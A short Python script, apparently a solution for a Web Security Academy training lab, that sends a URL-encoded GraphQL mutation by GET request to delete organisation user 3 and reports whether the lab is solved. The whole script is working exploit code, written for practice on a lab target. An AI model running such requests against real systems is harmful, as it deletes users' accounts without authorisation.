import requests
import sys
import json

def req(url):
    vuln_path = url+"/api?query=mutation+%7B%0A%09deleteOrganizationUser%28input%3A%7Bid%3A+3%7D%29+%7B%0A%09%09user+%7B%0A%09%09%09id%0A%09%09%7D%0A%09%7D%0A%7D"
    r = requests.get(url=vuln_path)
    if "deleteOrganizationUser" in r.text:
        print("Solved!")
    else:
        print("Failed!")


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s https://xxxxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net" % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("Exploiting...")
    req(url)


if __name__=='__main__':
    main()